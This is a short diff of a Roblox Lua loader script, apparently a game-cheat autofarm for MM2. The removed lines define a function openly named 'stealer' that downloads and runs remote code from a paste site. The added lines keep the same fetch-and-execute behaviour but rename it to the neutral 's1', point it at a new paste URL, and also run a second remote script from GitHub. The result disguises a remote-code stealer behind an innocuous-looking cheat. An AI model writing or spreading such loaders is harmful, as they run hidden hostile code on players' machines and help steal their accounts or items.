@@ -1,9 +1,8 @@
-local function stealer()
-    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/DCAQjcjwMD/0'))()
-end
-local function farm()
+local function s1() 
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/itfInq2UgQ/0", true))()
+end 
+local function s2() 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/LunnHubX99/mm2kuniauto/refs/heads/main/lua"))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
+end 
+task.spawn(s1)
+task.spawn(s2)
